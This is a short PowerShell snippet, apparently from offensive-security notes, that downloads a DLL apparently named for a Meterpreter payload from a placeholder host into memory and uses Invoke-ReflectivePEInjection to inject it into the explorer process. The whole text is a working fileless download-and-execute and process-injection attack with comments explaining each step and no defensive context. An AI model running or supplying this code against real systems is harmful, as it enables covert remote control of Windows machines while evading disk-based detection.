##save our remote dll into a byte array in memory 
$bytes = (New-Object System.Net.WebClient).DownloadData('http://ip/met.dll')
## locate explorer process
$procid = (Get-Process -Name explorer).Id
##import and run
Import-Module Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid